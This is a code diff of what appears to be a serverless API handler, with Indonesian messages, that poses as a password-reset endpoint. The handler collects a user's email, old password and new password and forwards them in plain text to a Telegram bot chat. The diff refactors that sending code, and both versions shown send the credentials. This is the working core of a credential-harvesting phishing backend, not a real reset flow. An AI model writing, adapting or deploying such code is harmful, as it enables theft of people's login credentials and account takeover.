@@ -1,3 +1,5 @@
+import fetch from 'node-fetch'; // Tambahkan ini hanya jika pakai Node <18
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Metode tidak diizinkan' });
@@ -9,25 +11,31 @@ export default async function handler(req, res) {
     return res.status(400).json({ message: 'Data tidak lengkap' });
   }
 
+  const botToken = process.env.BOT_TOKEN;
+  const chatId = process.env.CHAT_ID;
+
+  const text = `
+🔒 Permintaan Reset Password:
+📧 Email: ${email}
+🔑 Sandi Lama: ${oldPass}
+🆕 Sandi Baru: ${newPass}
+`;
+
   try {
-    const resp = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.CHAT_ID,
-        text: `🔐 Reset Password Request\n📧 Email: ${email}\n🔑 Old Pass: ${oldPass}\n🆕 New Pass: ${newPass}`
-      })
-    });
+    const telegramRes = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text })
+      }
+    );
 
-    if (!resp.ok) {
-      const errorText = await resp.text();
-      console.error('Telegram Error:', errorText);
-      return res.status(500).json({ message: 'Telegram request failed' });
-    }
+    if (!telegramRes.ok) throw new Error('Gagal kirim ke Telegram');
 
-    return res.status(200).json({ message: 'Berhasil' });
+    res.status(200).json({ message: 'Berhasil' });
   } catch (err) {
-    console.error('Error saat mengirim ke Telegram:', err.message);
-    return res.status(500).json({ message: 'Terjadi kesalahan internal' });
+    console.error(err);
+    res.status(500).json({ message: 'Gagal kirim ke Telegram' });
   }
 }
